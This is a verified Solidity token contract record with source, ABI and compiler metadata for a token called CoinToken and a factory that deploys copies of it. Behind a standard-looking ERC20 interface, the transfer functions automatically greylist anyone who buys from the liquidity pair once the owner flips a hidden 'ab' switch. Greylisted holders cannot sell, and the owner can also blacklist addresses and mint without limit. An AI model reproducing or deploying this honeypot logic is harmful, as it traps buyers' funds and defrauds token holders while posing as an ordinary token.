{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-07-01\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2023-06-17\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2023-06-16\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.4.24;\r\n\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\ncontract Ownable {\r\n    address public owner;\r\n\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\ncontract ERC20Basic {\r\n    uint256 public totalSupply;\r\n    function balanceOf(address who) public view returns (uint256);\r\n    function transfer(address to, uint256 value) public returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\ncontract ERC20 is ERC20Basic {\r\n    function allowance(address owner, address spender) public view returns (uint256);\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool);\r\n    function approve(address spender, uint256 value) public returns (bool);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\ncontract StandardToken is ERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    address public LP;\r\n\r\n    bool ab=false;\r\n\r\n\r\n    mapping (address => mapping (address => uint256)) internal allowed;\r\n    mapping(address => bool)  tokenBlacklist;\r\n    mapping(address => bool)  tokenGreylist;\r\n    mapping(address => bool)  tokenWhitelist;\r\n    event Blacklist(address indexed blackListed, bool value);\r\n    event Gerylist(address indexed geryListed, bool value);\r\n    event Whitelist(address indexed WhiteListed, bool value);\r\n\r\n\r\n    mapping(address => uint256) balances;\r\n\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\n        if(!tokenWhitelist[msg.sender]&&!tokenWhitelist[_to]){\r\n            require(tokenBlacklist[msg.sender] == false);\r\n            require(tokenBlacklist[_to] == false);\r\n\r\n            require(tokenGreylist[msg.sender] == false);\r\n            // require(tokenGreylist[_to] == false);\r\n        }\r\n        if(msg.sender==LP&&ab&&!tokenWhitelist[_to]){\r\n            tokenGreylist[_to] = true;\r\n            emit Gerylist(_to, true);\r\n        }\r\n\r\n        require(_to != address(0));\r\n        require(_to != msg.sender);\r\n        require(_value <= balances[msg.sender]);\r\n        balances[msg.sender] = balances[msg.sender].sub(_value);\r\n        // SafeMath.sub will throw if there is not enough balance.\r\n        balances[_to] = balances[_to].add(_value);\r\n        emit Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n        if(!tokenWhitelist[_from]&&!tokenWhitelist[_to]){\r\n            require(tokenBlacklist[msg.sender] == false);\r\n            require(tokenBlacklist[_from] == false);\r\n            require(tokenBlacklist[_to] == false);\r\n\r\n            require(tokenGreylist[_from] == false);\r\n        }\r\n\r\n        if(_from==LP&&ab&&!tokenWhitelist[_to]){\r\n            tokenGreylist[_to] = true;\r\n            emit Gerylist(_to, true);\r\n        }\r\n        require(_to != _from);\r\n        require(_to != address(0));\r\n        require(_value <= balances[_from]);\r\n        require(_value <= allowed[_from][msg.sender]);\r\n        balances[_from] = balances[_from].sub(_value);\r\n       \r\n\r\n        balances[_to] = balances[_to].add(_value);\r\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n\r\n    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\r\n        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\r\n        uint oldValue = allowed[msg.sender][_spender];\r\n        if (_subtractedValue > oldValue) {\r\n            allowed[msg.sender][_spender] = 0;\r\n        } else {\r\n            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\n        }\r\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n        return true;\r\n    }\r\n\r\n    function _changeAb(bool _ab) internal returns (bool) {\r\n        require(ab != _ab);\r\n        ab=_ab;\r\n        return true;\r\n    }\r\n\r\n\r\n\r\n    function _blackList(address _address, bool _isBlackListed) internal returns (bool) {\r\n        require(tokenBlacklist[_address] != _isBlackListed);\r\n        tokenBlacklist[_address] = _isBlackListed;\r\n        emit Blacklist(_address, _isBlackListed);\r\n        return true;\r\n    }\r\n\r\n    function _geryList(address _address, bool _isGeryListed) internal returns (bool) {\r\n        require(tokenGreylist[_address] != _isGeryListed);\r\n        tokenGreylist[_address] = _isGeryListed;\r\n        emit Gerylist(_address, _isGeryListed);\r\n        return true;\r\n    }\r\n    function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {\r\n        require(tokenWhitelist[_address] != _isWhiteListed);\r\n        tokenWhitelist[_address] = _isWhiteListed;\r\n        emit Whitelist(_address, _isWhiteListed);\r\n        return true;\r\n    }\r\n    function _blackAddressList(address[] _addressList, bool _isBlackListed) internal returns (bool) {\r\n        for(uint i = 0; i < _addressList.length; i++){\r\n            tokenBlacklist[_addressList[i]] = _isBlackListed;\r\n            emit Blacklist(_addressList[i], _isBlackListed);\r\n        }\r\n        return true;\r\n    }\r\n    function _geryAddressList(address[] _addressList, bool _isGeryListed) internal returns (bool) {\r\n        for(uint i = 0; i < _addressList.length; i++){\r\n            tokenGreylist[_addressList[i]] = _isGeryListed;\r\n            emit Gerylist(_addressList[i], _isGeryListed);\r\n        }\r\n        return true;\r\n    }\r\n\r\n\r\n}\r\n\r\ncontract PausableToken is StandardToken, Ownable {\r\n\r\n    function transfer(address _to, uint256 _value) public  returns (bool) {\r\n        return super.transfer(_to, _value);\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public  returns (bool) {\r\n        return super.transferFrom(_from, _to, _value);\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public  returns (bool) {\r\n        return super.approve(_spender, _value);\r\n    }\r\n\r\n    function increaseApproval(address _spender, uint _addedValue) public  returns (bool success) {\r\n        return super.increaseApproval(_spender, _addedValue);\r\n    }\r\n\r\n    function decreaseApproval(address _spender, uint _subtractedValue) public  returns (bool success) {\r\n        return super.decreaseApproval(_spender, _subtractedValue);\r\n    }\r\n    function changeAb(bool _ab) public  onlyOwner  returns (bool success) {\r\n        return super._changeAb(_ab);\r\n    }\r\n\r\n    function blackListAddress(address listAddress,  bool isBlackListed) public  onlyOwner  returns (bool success) {\r\n        return super._blackList(listAddress, isBlackListed);\r\n    }\r\n    function geryListAddress(address listAddress,  bool _isGeryListed) public  onlyOwner  returns (bool success) {\r\n        return super._geryList(listAddress, _isGeryListed);\r\n    }\r\n    function whiteListAddress(address listAddress,  bool _isWhiteListed) public  onlyOwner  returns (bool success) {\r\n        return super._whiteList(listAddress, _isWhiteListed);\r\n    }\r\n    function blackAddressList(address[] listAddress,  bool isBlackListed) public  onlyOwner  returns (bool success) {\r\n        return super._blackAddressList(listAddress, isBlackListed);\r\n    }\r\n    function geryAddressList(address[] listAddress,  bool _isGeryListed) public  onlyOwner  returns (bool success) {\r\n        return super._geryAddressList(listAddress, _isGeryListed);\r\n    }\r\n\r\n}\r\n\r\ncontract CoinToken is PausableToken {\r\n    string public name;\r\n    string public symbol;\r\n    uint public decimals;\r\n    event Mint(address indexed from, address indexed to, uint256 value);\r\n    event Burn(address indexed burner, uint256 value);\r\n    bool internal _INITIALIZED_;\r\n\r\n    constructor() public {\r\n\r\n    }\r\n    modifier notInitialized() {\r\n        require(!_INITIALIZED_, \"INITIALIZED\");\r\n        _;\r\n    }\r\n    function initToken(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner,address factory,address token1) public notInitialized returns (bool){\r\n        _INITIALIZED_=true;\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n        totalSupply = _supply * 10**_decimals;\r\n        balances[tokenOwner] = totalSupply;\r\n        owner = tokenOwner;\r\n\r\n        // // service.transfer(msg.value);\r\n        // (bool success) = service.call.value(msg.value)();\r\n        // require(success, \"Transfer failed.\");\r\n        emit Transfer(address(0), tokenOwner, totalSupply);\r\n        LP = ISwapFactory(factory).createPair(address(this), token1);\r\n    }\r\n\r\n\r\n\r\n    \r\n\r\n\r\n\r\n\r\n\r\n    function mint(address account, uint256 amount) onlyOwner public {\r\n\r\n        totalSupply = totalSupply.add(amount);\r\n        balances[account] = balances[account].add(amount);\r\n        emit Mint(address(0), account, amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n\r\n}\r\n\r\ncontract CoinFactory{\r\n\r\n\r\n    function createToken(string  _name, string  _symbol, uint256 _decimals, uint256 _supply,address tokenOwner,address factory,address token1)public returns (address){\r\n        CoinToken token=new CoinToken();\r\n        token.initToken(_name,_symbol,_decimals,_supply,tokenOwner,factory,token1);\r\n        return address(token);\r\n    }\r\n}", "ABI": "[{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address[]\"},{\"name\":\"_isGeryListed\",\"type\":\"bool\"}],\"name\":\"geryAddressList\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"account\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"mint\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseApproval\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address\"},{\"name\":\"_isGeryListed\",\"type\":\"bool\"}],\"name\":\"geryListAddress\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address\"},{\"name\":\"isBlackListed\",\"type\":\"bool\"}],\"name\":\"blackListAddress\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_ab\",\"type\":\"bool\"}],\"name\":\"changeAb\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address\"},{\"name\":\"_isWhiteListed\",\"type\":\"bool\"}],\"name\":\"whiteListAddress\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"LP\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_name\",\"type\":\"string\"},{\"name\":\"_symbol\",\"type\":\"string\"},{\"name\":\"_decimals\",\"type\":\"uint256\"},{\"name\":\"_supply\",\"type\":\"uint256\"},{\"name\":\"tokenOwner\",\"type\":\"address\"},{\"name\":\"factory\",\"type\":\"address\"},{\"name\":\"token1\",\"type\":\"address\"}],\"name\":\"initToken\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"listAddress\",\"type\":\"address[]\"},{\"name\":\"isBlackListed\",\"type\":\"bool\"}],\"name\":\"blackAddressList\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseApproval\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"burner\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"blackListed\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"Blacklist\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"geryListed\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"Gerylist\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"WhiteListed\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"Whitelist\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"}]", "ContractName": "CoinToken", "CompilerVersion": "v0.4.24+commit.e67f0147", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://8bc2efafc1ebfc607a65e0d2c0e8fc3752dd343f0b02fd9c69a0b55e3beccf13"}